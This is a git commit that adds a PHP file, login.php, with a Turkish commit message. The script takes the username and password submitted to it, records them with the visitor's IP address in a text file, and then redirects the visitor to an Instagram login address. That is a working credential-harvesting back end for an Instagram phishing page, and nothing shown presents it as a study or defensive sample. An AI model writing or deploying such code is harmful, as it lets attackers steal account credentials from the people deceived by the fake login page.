67eaefb50c8b2e2a15d34f997fdba1a906350606
aydemir98 <aydemirmm111@gmail.com>
2022-01-13 20:34:01 +0300

    son hali

---
+++ login.php
@@ -0,0 +1,16 @@
+
+<?php 
+
+$kullaniciadi = $_POST['Username'];
+$sifre = $_POST['Password'];
+$ip =$_SERVER["REMOTE_ADDR"];
+
+$dosya = fopen ("bilgiler.txt" , 'a'); 
+$yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n";
+fwrite ( $dosya , $yaz ) ;
+fclose ($dosya);
+
+header("Location: wwww.instagram.com/accounts/login");
+die();
+
+ ?>
